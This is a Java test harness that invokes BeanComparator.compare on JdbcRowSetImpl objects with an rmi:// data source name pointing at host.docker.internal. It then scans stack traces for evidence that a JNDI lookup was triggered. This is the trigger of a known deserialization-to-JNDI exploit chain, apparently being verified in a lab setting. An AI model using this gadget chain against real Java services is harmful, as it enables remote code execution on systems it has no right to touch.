import java.io.*;
import java.lang.reflect.*;
import java.util.*;

/**
 * Direct test: call BeanComparator.compare() on JdbcRowSetImpl directly
 * and trace the full exception to see if JNDI/connect is reached.
 */
public class DeserTestDirect {
    public static void main(String[] args) throws Exception {
        System.out.println("=== Direct BeanComparator.compare() Test ===\n");

        // Test 1: Direct BeanComparator call
        System.out.println("[Test 1] BeanComparator.compare(JdbcRowSetImpl, JdbcRowSetImpl)");
        Class<?> beanCompClass = Class.forName("org.apache.commons.beanutils.BeanComparator");
        Object beanComp = beanCompClass.getDeclaredConstructor(String.class)
            .newInstance("databaseMetaData");

        Class<?> jrsClass = Class.forName("com.sun.rowset.JdbcRowSetImpl");
        Object jrs1 = jrsClass.getDeclaredConstructor().newInstance();
        jrsClass.getMethod("setDataSourceName", String.class)
            .invoke(jrs1, "rmi://host.docker.internal:1389/DIRECT_TEST");

        Object jrs2 = jrsClass.getDeclaredConstructor().newInstance();

        Comparator comp = (Comparator) beanComp;
        try {
            comp.compare(jrs1, jrs2);
            System.out.println("  Returned normally (unexpected)");
        } catch (Throwable e) {
            // Print full stack trace
            StringWriter sw = new StringWriter();
            e.printStackTrace(new PrintWriter(sw));
            String trace = sw.toString();

            // Check for JNDI evidence
            boolean hasJndi = trace.contains("javax.naming") || trace.contains("InitialContext")
                || trace.contains("connect") || trace.contains("lookup")
                || trace.contains("JNDI") || trace.contains("Connection refused");

            System.out.println("  JNDI evidence in trace: " + hasJndi);

            // Print filtered trace
            for (String line : trace.split("\n")) {
                String lower = line.toLowerCase();
                if (lower.contains("beancomparator") || lower.contains("jdbcrowset")
                    || lower.contains("connect") || lower.contains("jndi")
                    || lower.contains("lookup") || lower.contains("initialcontext")
                    || lower.contains("naming") || lower.contains("caused by")
                    || lower.contains("databasemetadata") || lower.contains("refused")) {
                    System.out.println("  " + line.trim());
                }
            }

            if (hasJndi) {
                System.out.println("\n  *** CONFIRMED: JNDI/connect triggered! ***");
            }
        }

        // Test 2: Try with autoCommit property instead (alternative path)
        System.out.println("\n[Test 2] Direct JdbcRowSetImpl.getDatabaseMetaData()");
        try {
            Method m = jrsClass.getMethod("getDatabaseMetaData");
            m.invoke(jrs1);
        } catch (Throwable e) {
            StringWriter sw = new StringWriter();
            e.printStackTrace(new PrintWriter(sw));
            String trace = sw.toString();
            boolean hasJndi = trace.contains("javax.naming") || trace.contains("connect")
                || trace.contains("lookup") || trace.contains("Connection refused");
            System.out.println("  JNDI evidence: " + hasJndi);
            for (String line : trace.split("\n")) {
                String lower = line.toLowerCase();
                if (lower.contains("connect") || lower.contains("jndi") || lower.contains("lookup")
                    || lower.contains("naming") || lower.contains("caused by")
                    || lower.contains("refused") || lower.contains("datasource")) {
                    System.out.println("  " + line.trim());
                }
            }
            if (hasJndi) {
                System.out.println("\n  *** CONFIRMED: getDatabaseMetaData() triggers JNDI! ***");
            }
        }
    }
}
